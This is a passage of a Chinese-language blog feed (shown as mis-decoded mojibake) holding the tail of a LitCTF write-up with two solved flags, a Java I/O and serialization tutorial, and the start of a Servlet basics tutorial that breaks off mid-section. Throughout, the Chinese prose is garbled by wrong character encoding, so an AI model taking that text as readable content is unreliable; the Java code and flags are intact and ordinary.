keyï¼Œåº”è¯¥æ˜¯ä»¿å°„å¯†ç ï¼Œä»¥åŠ #åé¢æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ ¼å¼å¾ˆæƒ³ flagã€‚ä¹‹åä»¿å°„å¯†ç è§£å†³ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;w13e5hake_1s_a_900d_t3a771c_t001_a&#125;</span><br></pre></td></tr></table></figure><h2 id="9-osint-æ¢å§¬å»å“ªäº†_0"><a class="markdownIt-Anchor" href="#9-osint-æ¢å§¬å»å“ªäº†_0">#</a> 9ã€OSINT æ¢å§¬å»å“ªäº†ï¼Ÿ_0</h2><p>â€‹åˆæ˜¯ç¤¾å·¥ (T^T)ï¼š</p><p>otfound (åˆçº§)</p><p>â€‹ä¸€å¼ å›¾ç‰‡ï¼Œè®°äº‹æœ¬æ‰“å¼€ï¼Œå‰å‡ è¡Œæœ‰ flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;Its_404_but_1ts_n0t_a_page&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTFerçš„æ¯”èµ›ä¹‹è·¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWebåŸºç¡€(ä¸€)-IOæ“ä½œ</title>
      <link href="/posts/20a3be2d.html"/>
      <url>/posts/20a3be2d.html</url>
      
        <content type="html"><![CDATA[<h1 id="java-ioå·¥ä½œæœºåˆ¶"><a class="markdownIt-Anchor" href="#java-ioå·¥ä½œæœºåˆ¶">#</a> Java I/O å·¥ä½œæœºåˆ¶ï¼š</h1><p><strong>æ³¨ï¼šç®€è¦ç¬”è®°ï¼Œç¤ºä¾‹ä»£ç å¯èƒ½è¾ƒå°‘ï¼Œç”šè‡³æ²¡æœ‰ã€‚</strong></p><h2 id="1-java-çš„-io-ç±»åº“çš„åŸºæœ¬æ¶æ„"><a class="markdownIt-Anchor" href="#1-java-çš„-io-ç±»åº“çš„åŸºæœ¬æ¶æ„">#</a> 1ã€Java çš„ I/O ç±»åº“çš„åŸºæœ¬æ¶æ„ã€‚</h2><pre><code>Java çš„ I/O æ“ä½œç±»åœ¨åŒ… java.io ä¸‹ï¼Œå¤§æ¦‚æœ‰å°†è¿‘80ä¸ªç±»ï¼Œè¿™äº›ç±»å¤§æ¦‚å¯ä»¥åˆ†ä¸ºå¦‚ä¸‹å››ç»„ã€‚</code></pre><ul><li>åŸºäºå­—èŠ‚æ“ä½œçš„ I/O æ¥å£ï¼šInputStream å’Œ OutputStream ã€‚</li><li>åŸºäºå­—ç¬¦æ“ä½œçš„ I/O æ¥å£ï¼šWriter å’Œ Reader ã€‚</li><li>åŸºäºç£ç›˜æ“ä½œçš„ I/O æ¥å£ï¼šFileã€‚</li><li>åŸºäºç½‘ç»œæ“ä½œçš„ I/O æ¥å£ï¼šSocketã€‚</li></ul><h3 id="11-åŸºäºå­—èŠ‚çš„-io-æ“ä½œæ¥å£"><a class="markdownIt-Anchor" href="#11-åŸºäºå­—èŠ‚çš„-io-æ“ä½œæ¥å£">#</a> 1.1ã€åŸºäºå­—èŠ‚çš„ I/O æ“ä½œæ¥å£</h3><pre><code>åŸºäºå­—èŠ‚çš„ I/O æ“ä½œæ¥å£è¾“å…¥å’Œè¾“å‡ºåˆ†åˆ«æ˜¯ï¼šInputStream å’Œ OutputStream ã€‚InputStream çš„ç±»å±‚æ¬¡å¦‚ä¸‹ï¼š</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/93c3c26c8f0c429d9c12af10d397733a.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><pre><code>è¾“å…¥æµæ ¹æ®æ•°æ®ç±»å‹å’Œæ“ä½œæ–¹å¼åˆè¢«åˆ’åˆ†ä¸ºè‹¥å¹²ä¸ªå­ç±»ï¼Œæ¯ä¸ªå­ç±»åˆ†åˆ«å¤„ç†ä¸åŒæ“ä½œç±»å‹ã€‚OutputStream  çš„ç±»å±‚æ¬¡ç»“æ„ä¹Ÿç±»ä¼¼ï¼Œå¦‚ä¸‹å›¾ï¼š</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/00775864970f46c398a03144a73f5731.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="12-åŸºäºå­—ç¬¦çš„-io-æ“ä½œæ¥å£"><a class="markdownIt-Anchor" href="#12-åŸºäºå­—ç¬¦çš„-io-æ“ä½œæ¥å£">#</a> 1.2ã€åŸºäºå­—ç¬¦çš„ I/O æ“ä½œæ¥å£</h3><pre><code>ä¸‹å›¾æ˜¯å†™å­—ç¬¦çš„ I/O æ“ä½œæ¥å£æ¶‰åŠçš„ç±»ï¼ŒWriter ç±»æä¾›äº†ä¸€ä¸ªæŠ½è±¡æ–¹æ³• write(char cbuf[],int off,int len)ã€‚</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/c64a10bb54654d2582c6ab90569e86af.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><pre><code>è¯»å­—ç¬¦çš„æ“ä½œæ¥å£ä¹Ÿæœ‰ç±»ä¼¼çš„ç»“æ„ï¼Œå¦‚ä¸‹å›¾ï¼š</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/f5005cbcaaff4263931e50ded600ba04.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><pre><code>è¯»å­—ç¬¦çš„æ“ä½œæ¥å£æ˜¯ int read(char cbuf[],int off,int len)ï¼Œã€‚è¿”å›è¯»åˆ°çš„nä¸ªå­—èŠ‚æ•°ï¼Œä¸ç®¡æ˜¯ Writer è¿˜æ˜¯ Reader ç±»ï¼Œå®ƒä»¬éƒ½åªå®šä¹‰äº†è¯»å–æˆ–å†™å…¥çš„æ•°æ®å­—ç¬¦çš„æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯æ€ä¹ˆå†™æˆ–è¯»ã€‚</code></pre><h3 id="13-å­—èŠ‚ä¸å­—ç¬¦çš„è½¬åŒ–æ¥å£"><a class="markdownIt-Anchor" href="#13-å­—èŠ‚ä¸å­—ç¬¦çš„è½¬åŒ–æ¥å£">#</a> 1.3ã€å­—èŠ‚ä¸å­—ç¬¦çš„è½¬åŒ–æ¥å£</h3><pre><code>å­—ç¬¦åˆ°å­—èŠ‚éœ€è¦è½¬åŒ–ï¼Œå…¶ä¸­ï¼Œè¯»çš„è½¬åŒ–è¿‡ç¨‹å¦‚ä¸‹ï¼š</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/0430cb0a57574ced8bd3c3a5d50eb254.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><pre><code>InputStreamReader ç±»æ˜¯å­—èŠ‚åˆ°å­—ç¬¦çš„è½¬åŒ–æ¡¥æ¢ï¼ŒInputSream åˆ° Reader çš„è¿‡ç¨‹è¦æŒ‡å®šç¼–ç å­—ç¬¦é›†ï¼Œå¦åˆ™å°†é‡‡ç”¨æ“ä½œç³»ç»Ÿé»˜è®¤å­—ç¬¦é›†ï¼Œå¾ˆå¯èƒ½ä¼šå‡ºç°ä¹±ç é—®é¢˜ã€‚SteamDecoder æ­£æ˜¯å®Œæˆå­—èŠ‚åˆ°å­—ç¬¦çš„è§£ç çš„å®ç°ç±»ã€‚ç±»ä¼¼å¦‚ä¸‹ä»£ç è¯»åˆ°ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼š</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">            <span class="type">char</span>[] buf = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">FileReader</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (f.read(buf) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                str.append(buf);</span><br><span class="line">            &#125;</span><br><span class="line">            str.toString();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><pre><code>FileReader ç±»å°±æ˜¯æŒ‰ç…§ä¸Šé¢çš„å·¥ä½œæ–¹å¼è¯»å–æ–‡ä»¶çš„ï¼ŒFileReader ç»§æ‰¿äº† InputStramReader ç±»ï¼Œå®é™…ä¸Šæ—¶è¯»å–æ–‡ä»¶æµï¼Œç„¶åé€šè¿‡ StreamDecoder è§£ç æˆ char ï¼Œåªä¸è¿‡è¿™é‡Œçš„ç¼–ç å­—ç¬¦é›†æ—¶é»˜è®¤å­—ç¬¦é›†ã€‚å†™å…¥ä¹Ÿæ˜¯ç±»ä¼¼çš„è¿‡ç¨‹ï¼š</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/8b8af04f03ea4ba9851c5648efe58d48.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><pre><code>é€šè¿‡ OutputStreamWriter ç±»å®Œæˆå­—ç¬¦åˆ°å­—èŠ‚çš„ç¼–ç è¿‡ç¨‹ï¼Œç”± StreamEncoder å®Œæˆç¼–ç è¿‡ç¨‹ã€‚</code></pre><h2 id="2-ç£ç›˜-io-å·¥ä½œæœºåˆ¶"><a class="markdownIt-Anchor" href="#2-ç£ç›˜-io-å·¥ä½œæœºåˆ¶">#</a> 2ã€ç£ç›˜ I/O å·¥ä½œæœºåˆ¶ï¼š</h2><h3 id="21-å‡ ç§è®¿é—®æ–‡ä»¶çš„æ–¹å¼"><a class="markdownIt-Anchor" href="#21-å‡ ç§è®¿é—®æ–‡ä»¶çš„æ–¹å¼">#</a> 2.1ã€å‡ ç§è®¿é—®æ–‡ä»¶çš„æ–¹å¼</h3><ol><li>æ ‡å‡†è®¿é—®æ–‡ä»¶æ–¹å¼ã€‚</li><li>ç›´æ¥ I/O æ–¹å¼ã€‚</li><li>åŒæ­¥è®¿é—®æ–‡ä»¶æ–¹å¼ã€‚</li><li>å¼‚æ­¥è®¿é—®æ–‡ä»¶æ–¹å¼ã€‚</li><li>å†…å­˜æ˜ å°„æ–¹å¼ã€‚</li></ol><h3 id="22-java-è®¿é—®ç£ç›˜æ–‡ä»¶"><a class="markdownIt-Anchor" href="#22-java-è®¿é—®ç£ç›˜æ–‡ä»¶">#</a> 2.2ã€Java è®¿é—®ç£ç›˜æ–‡ä»¶</h3><pre><code>å½“ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶è·¯å¾„æ—¶ï¼Œå°†ä¼šæ ¹æ®è¿™ä¸ªè·¯å¾„åˆ›å»ºä¸€ä¸ª File å¯¹è±¡æ¥è¡¨ç¤ºè¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åæ ¹æ®è¿™ä¸ª File å¯¹è±¡åˆ›å»ºçœŸæ­£è¯»å–æ–‡ä»¶çš„æ“ä½œå¯¹è±¡ï¼Œè¿™æ—¶å°†ä¼šçœŸæ­£åˆ›å»ºä¸€ä¸ªå…³è”çœŸå®å­˜åœ¨çš„ç£ç›˜æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ FileDescriptorï¼Œé€šè¿‡è¿™ä¸ªå¯¹è±¡å¯ä»¥ç›´æ¥æ§åˆ¶è¿™ä¸ªç£ç›˜æ–‡ä»¶ï¼Œã€‚</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/d55db7d024654510987ff7e1cbce21c1.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="23-java-åºåˆ—åŒ–æŠ€æœ¯"><a class="markdownIt-Anchor" href="#23-java-åºåˆ—åŒ–æŠ€æœ¯">#</a> 2.3ã€Java åºåˆ—åŒ–æŠ€æœ¯</h3><pre><code>Java åºåˆ—åŒ–å°±æ˜¯å°†ä¸€ä¸ªå¯¹è±¡è½¬åŒ–ä¸ºä¸€ä¸²äºŒè¿›åˆ¶è¡¨ç¤ºçš„å­—èŠ‚æ•°ç»„ï¼Œé€šè¿‡ä¿å­˜æˆ–è½¬ç§»è¿™äº›å­—èŠ‚æ•°æ®æ¥è¾¾åˆ°æŒä¹…åŒ–çš„ç›®çš„ã€‚éœ€è¦æŒä¹…åŒ–ï¼Œå¯¹è±¡å¿…é¡»ç»§æ‰¿ java.io.Serializable æ¥å£ã€‚ååºåˆ—åŒ–åˆ™æ˜¯ç›¸åçš„è¿‡ç¨‹ï¼Œå°†è¿™ä¸ªå­—èŠ‚æ•°ç»„å†é‡æ–°æ„é€ æˆå¯¹è±¡ã€‚æˆ‘ä»¬çŸ¥é“ååºåˆ—åŒ–æ—¶ï¼Œå¿…é¡»æœ‰åŸå§‹ç±»ä½œä¸ºæ¨¡æ¿ï¼Œæ‰èƒ½å°†è¿™ä¸ªå¯¹è±¡è¿˜åŸï¼Œä»è¿™ä¸ªè¿‡ç¨‹æˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼Œåºåˆ—åŒ–çš„æ•°æ®å¹¶ä¸åƒ class æ–‡ä»¶é‚£æ ·ä¿å­˜ç±»çš„å®Œæ•´çš„ç»“æ„ä¿¡æ¯ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„åºåˆ—åŒ–çš„ä»£ç ï¼š</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Serialize</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> - <span class="number">6849794470754660011L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">1390</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d:/serialize.dat&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">            <span class="type">Serialize</span> <span class="variable">serialize</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Serialize</span>();</span><br><span class="line">            oos.writeObject(serialize);</span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>åºåˆ—åŒ–çš„æ–‡ä»¶äºŒè¿›åˆ¶å­—èŠ‚æ•°æ®å¦‚ä¸‹ï¼š</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/6544ad53b377490c9f7a60d5ad99cb04.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ol><li><p>ç¬¬ä¸€éƒ¨åˆ†æ˜¯ååºåˆ—åŒ–æ–‡ä»¶å¤´ã€‚</p><p><img data-src="https://img-blog.csdnimg.cn/direct/ab3ed5c157264bbc833860233f8b314a.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>ç¬¬äºŒéƒ¨åˆ†æ˜¯è¦ååºåˆ—åŒ–çš„ç±»çš„æè¿°ï¼Œåœ¨è¿™é‡Œæ˜¯ Serialize ç±»ã€‚</p><p><img data-src="https://img-blog.csdnimg.cn/direct/7f9959f931e741a4bee64dbd23c56c97.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>ç¬¬ä¸‰éƒ¨åˆ†æ˜¯å¯¹è±¡ä¸­å„ä¸ªå±æ€§é¡¹çš„æè¿°</p><p><img data-src="https://img-blog.csdnimg.cn/direct/4e058285c2b246fa9cfc8c911e61ecfd.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>ç¬¬å››éƒ¨åˆ†è¾“å‡ºè¯¥å¯¹è±¡çš„çˆ¶ç±»ä¿¡æ¯æè¿°ï¼Œè¿™é‡Œæ²¡æœ‰çˆ¶ç±»ï¼Œå¦‚æœæœ‰ï¼Œæ•°æ®æ ¼å¼ä¸ç¬¬äºŒéƒ¨åˆ†ä¸€æ ·ã€‚</p><p><img data-src="https://img-blog.csdnimg.cn/direct/67a0a799eefe4e809e27094075061210.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>ç¬¬äº”éƒ¨åˆ†è¾“å‡ºå¯¹è±¡çš„å±æ€§é¡¹çš„å®é™…å€¼ï¼Œå¦‚æœå±æ€§é¡¹æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆè¿™é‡Œè¿˜å°†åºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡ï¼Œè§„åˆ™å’Œç¬¬äºŒéƒ¨åˆ†ä¸€æ ·ã€‚</p><p><img data-src="https://img-blog.csdnimg.cn/direct/e6306bc60426477eb218df3426486b27.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Javaä»å…¥é—¨åˆ°å…¥ç‹± </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸‰ã€ServletåŸºç¡€</title>
      <link href="/posts/3d5d6561.html"/>
      <url>/posts/3d5d6561.html</url>
      
        <content type="html"><![CDATA[<p><strong>æ³¨ï¼šå› ä¸ºæˆ‘å¹¶ä¸å®Œå…¨æ˜¯ä¸ºäº†ä» 0 å¼€å§‹ Java å¼€å‘ï¼Œå› æ­¤ï¼Œæˆ‘è¿™é‡Œå…ˆæš‚æ—¶è·³è¿‡ç¬¬äºŒç« æœåŠ¡å™¨ç¯å¢ƒç›¸å…³çš„å†…å®¹ï¼Œç›´æ¥å¼€å§‹ç¬¬ä¸‰ç« çš„å†…å®¹ã€‚</strong></p><h1 id="31-servlet-çš„åŸºæœ¬ç»“æ„"><a class="markdownIt-Anchor" href="#31-servlet-çš„åŸºæœ¬ç»“æ„">#</a> 3.1ã€Servlet çš„åŸºæœ¬ç»“æ„ï¼š</h1><p>â€‹ä¸‹é¢çš„ä»£ç ç»™å‡ºäº†ä¸€ä¸ªåŸºæœ¬çš„ Servlet ï¼Œå®ƒå¤„ç† GET è¯·æ±‚ã€‚GET è¯·æ±‚æ˜¯æµè§ˆå™¨è¯·æ±‚çš„å¸¸è§ç±»å‹ï¼Œç”¨æ¥è¯·æ±‚ Web é¡µé¢ã€‚ç”¨æˆ·åœ¨åœ°å€æ ä¸­è¾“å…¥ URL ã€ç‚¹å‡» Web é¡µé¢å†…çš„è¿æ¥ã€æˆ–æäº¤æ²¡æœ‰æŒ‡å®š METHOD æˆ– METHOD=â€œGETâ€ çš„ HTML è¡¨å•æ—¶ï¼Œæµè§ˆå™¨éƒ½ä¼šç”Ÿæˆè¿™ä¸ªè¯·æ±‚ã€‚ Servlet è¿˜å¯ä»¥å®¹æ˜“åœ°å¤„ç† POST è¯·æ±‚ï¼ˆæäº¤ METHOD=â€œPOSTâ€ çš„ HTML è¡¨å•æ—¶ï¼Œä¼šç”Ÿæˆ POST è¯·æ±‚ï¼‰ã€‚HTML è¡¨å•çš„ä½¿ç”¨ç»†èŠ‚ä»¥åŠ GET å’Œ POST ä¹‹é—´çš„åŒºåˆ«ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firstweb.study01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTemplate</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Use &quot;request&quot; to read incoming HTTP headers</span></span><br><span class="line">        <span class="comment">//(e.g.,Cookies) and query data from HTML forms .</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Use &quot;response&quot; to specify the HTTP response status</span></span><br><span class="line">        <span class="comment">//code and headers (e.g.,the content type ,cookies)</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        <span class="comment">//Use &quot;out&quot; to send content to browser</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹Servlet ä¸€èˆ¬æ‰©å±• HttpServlet ï¼Œå¹¶ä¾æ•°æ®å‘é€æ–¹å¼çš„ä¸åŒï¼ˆGET æˆ– POSTï¼‰ï¼Œè¦†ç›– doGet æˆ– doPost æ–¹æ³•ã€‚å¦‚æœå¸Œæœ› Servlet å¯¹ GET å’Œ POST è¯·æ±‚é‡‡ç”¨åŒæ ·çš„è¡ŒåŠ¨ï¼Œåªéœ€è¦è®© doGet è°ƒç”¨ doPost ï¼Œåä¹‹ï¼Œä¾ç„¶ã€‚</p><p>â€‹doGet å’Œ doPost éƒ½æ¥å—ä¸¤ä¸ªå‚æ•°ï¼šHttpServletRequest å’Œ HttpServletResponse ã€‚é€šè¿‡ HttpServletRequestï¼Œå¯ä»¥å¾—åˆ°æ‰€æœ‰çš„è¾“å…¥æ•°æ®ï¼›è¿™ä¸ªç±»æä¾›ç›¸åº”çš„æ–¹æ³•ï¼Œé€šè¿‡è¿™äº›æ–¹æ³•å¯ä»¥æ‰¾å‡ºè¯¸å¦‚è¡¨å•ï¼ˆæŸ¥è¯¢ï¼‰æ•°æ®ã€HTTP è¯·æ±‚æŠ¥å¤´å’Œå®¢æˆ·çš„ä¸»æœºåç­‰ä¿¡æ¯ã€‚é€šè¿‡ HttpServletResponse å¯ä»¥åˆ¶å®šè¾“å‡ºä¿¡æ¯ï¼Œæ¯”å¦‚ HTTP çŠ¶æ€ä»£ç ï¼ˆ200ï¼Œ404 ç­‰ï¼‰å’Œå“åº”æŠ¥å¤´ï¼ˆContent-Typeï¼ŒSet-Cookie ç­‰ï¼‰ã€‚æœ€é‡è¦çš„æ˜¯ï¼Œé€šè¿‡ HttpServletResponse å¯ä»¥è·å¾— PrintWriter ï¼Œç”¨å®ƒå¯ä»¥å°†æ–‡æ¡£å†…å®¹å‘é€ç»™å®¢æˆ·ã€‚å¯¹äºç®€å•çš„ Servlet ï¼Œå¤§éƒ¨åˆ†å·¥ä½œéƒ½èŠ±åœ¨ç”¨ println è¯­å¥ç”ŸæˆæœŸæœ›çš„é¡µé¢ä¸Šã€‚</p><p>â€‹ç”±äº doGet å’Œ doPost  æŠ›å‡ºä¸¤ç§å¼‚å¸¸ï¼ˆServletException å’Œ IOExceptionï¼‰ï¼Œæ‰€ä»¥åœ¨æ–¹æ³•å£°æ˜ä¸­åŒ…æ‹¬ä»–ä»¬ã€‚æœ€åï¼Œè¿˜å¿…é¡»å¯¼å…¥ <span class="exturl" data-url="aHR0cDovL2phdmEuaW8=">java.io</span>ï¼ˆPrintWrite ç­‰ï¼‰ã€javax.servletï¼ˆHttpServlet ç­‰ï¼‰å’Œ javax.servlet.httpï¼ˆHttpServletResponse å’Œ HttpServletRequestï¼‰ä¸­çš„ç±»ã€‚</p><h1 id="32-ç”Ÿæˆçº¯æ–‡æœ¬çš„-servlet"><a class="markdownIt-Anchor" href="#32-ç”Ÿæˆçº¯æ–‡æœ¬çš„-servlet">#</a> 3.2ã€ç”Ÿæˆçº¯æ–‡æœ¬çš„ Servlet ï¼š</h1><p>â€‹ä»£ç  3.2 åˆ—å‡ºäº†ä¸€ä¸ªè¾“å‡ºçº¯æ–‡æœ¬çš„ç®€å• Servletï¼Œå›¾ 3.2 æ˜¯å®ƒçš„è¾“å‡ºã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä»£ç  3.2 </span></span><br><span class="line"><span class="keyword">package</span> com.firstweb.study01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å›¾ 3.2ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/5c0bf5adcfa84c18800d9ca4c37c61c3.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="33-ç”Ÿæˆ-html-çš„-servlet"><a class="markdownIt-Anchor" href="#33-ç”Ÿæˆ-html-çš„-servlet">#</a> 3.3ã€ç”Ÿæˆ HTML çš„ Servletï¼š</h1><p>â€‹å¤§å¤šæ•°çš„ Servlet ç”Ÿæˆ HTML ï¼Œè€Œéå‰è¿°ä¾‹å­ä¸­çš„çº¯æ–‡æœ¬ã€‚è¦ç”Ÿæˆ HTML ï¼Œéœ€è¦åœ¨åˆšæ‰ä»‹ç»çš„è¿‡ç¨‹ä¸­åŠ å…¥å¦‚ä¸‹ä¸‰æ­¥ï¼š</p><ol><li><p>å‘ŠçŸ¥æµè§ˆå™¨ï¼Œå³å°†å‘å®ƒå‘é€  HTML 